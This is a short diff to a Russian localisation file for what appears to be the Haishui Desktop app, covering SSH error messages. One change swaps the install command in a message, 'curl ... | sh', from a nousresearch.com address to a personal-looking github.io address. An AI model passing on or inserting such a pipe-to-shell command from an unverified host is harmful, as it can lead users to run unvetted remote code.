@@ -1262,7 +1262,7 @@ export const ru = defineLocale({
       sshErrHostKey:
         'Ключ хоста ИЗМЕНИЛСЯ с последнего подключения. Убедитесь, что это ожидаемо, затем выполните ssh-keygen -R <host> и переподключитесь.',
       sshErrNotInstalled:
-        'Haishui не установлен на удалённой машине. Установите его там (curl -fsSL https://haishui-agent.nousresearch.com/install.sh | sh) или задайте путь к Haishui.',
+        'Haishui не установлен на удалённой машине. Установите его там (curl -fsSL https://aiqinghaiwork163.github.io/haishui-agent/install.sh | sh) или задайте путь к Haishui.',
       sshErrPlatform:
         'Неподдерживаемая удалённая платформа. SSH-режим Haishui Desktop поддерживает удалённые хосты Linux, macOS и Windows.',
       sshErrTimeout: 'SSH-соединение истекло. Хост может быть недоступен или «спит».',
